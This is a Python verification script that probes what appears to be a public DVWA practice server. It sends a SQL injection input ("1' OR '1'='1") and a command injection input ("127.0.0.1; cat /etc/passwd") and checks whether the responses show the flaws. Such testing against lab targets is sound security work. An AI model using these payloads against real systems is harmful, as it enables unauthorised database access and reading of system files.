import json
import time
from pathlib import Path
import httpx

BASE = "https://pentest-ground.com:4280"


def request(client, method, url, **kwargs):
    started = time.perf_counter()
    try:
        response = client.request(method, url, **kwargs)
        return {"status": response.status_code, "elapsed": round(time.perf_counter() - started, 4), "size": len(response.content), "body": response.text, "headers": dict(response.headers), "error": None}
    except httpx.HTTPError as exc:
        return {"status": 0, "elapsed": round(time.perf_counter() - started, 4), "size": 0, "body": "", "headers": {}, "error": str(exc)}


def main():
    results = {}
    with httpx.Client(timeout=45, follow_redirects=True, headers={"User-Agent": "APISecurityPlatform-IndependentVerification/1.0"}) as client:
        sqli = BASE + "/vulnerabilities/sqli/"
        sql_control = request(client, "GET", sqli, params={"id": "1", "Submit": "Submit"})
        sql_probe = request(client, "GET", sqli, params={"id": "1' OR '1'='1", "Submit": "Submit"})
        results["sqli"] = {
            "control": {k: v for k, v in sql_control.items() if k != "body"},
            "probe": {k: v for k, v in sql_probe.items() if k != "body"},
            "probe_has_database_error": any(t in sql_probe["body"].lower() for t in ("sql", "mysql", "syntax", "database error")),
            "probe_has_multiple_user_rows": sql_probe["body"].lower().count("first name") > sql_control["body"].lower().count("first name"),
            "response_delta": sql_probe["size"] - sql_control["size"],
        }

        command = BASE + "/vulnerabilities/exec/"
        cmd_control = request(client, "POST", command, data={"ip": "127.0.0.1", "Submit": "Submit"})
        cmd_probe = request(client, "POST", command, data={"ip": "127.0.0.1; cat /etc/passwd", "Submit": "Submit"})
        results["command_injection"] = {
            "control": {k: v for k, v in cmd_control.items() if k != "body"},
            "probe": {k: v for k, v in cmd_probe.items() if k != "body"},
            "probe_has_passwd_marker": "root:x:0:0:" in cmd_probe["body"],
            "response_delta": cmd_probe["size"] - cmd_control["size"],
        }

    Path("tests/dvwa_manual_module_results.json").write_text(json.dumps(results, indent=2) + "\n")
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
